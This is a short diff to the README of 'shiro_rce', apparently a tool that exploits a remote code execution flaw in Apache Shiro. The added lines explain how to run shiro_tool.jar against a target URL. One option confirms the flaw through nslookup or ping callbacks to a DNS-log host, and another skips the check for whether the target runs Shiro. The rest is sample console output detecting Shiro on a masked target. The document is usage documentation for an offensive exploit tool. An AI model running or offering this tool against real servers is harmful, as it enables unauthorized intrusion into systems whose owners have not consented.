@@ -1,6 +1,10 @@
 # shiro_rce
 
 ```
+java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/  nslookup/ping nocheck
+nslookup/ping --> use nslookup dnslog.com check(default)./use ping dnslog.com check.
+nocheck --> skip check target is shiro or not.
+
 [admin@ shiro]java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/          
 [-] target: https://xx.xx.xx.xx/
 [-] target is use shiro
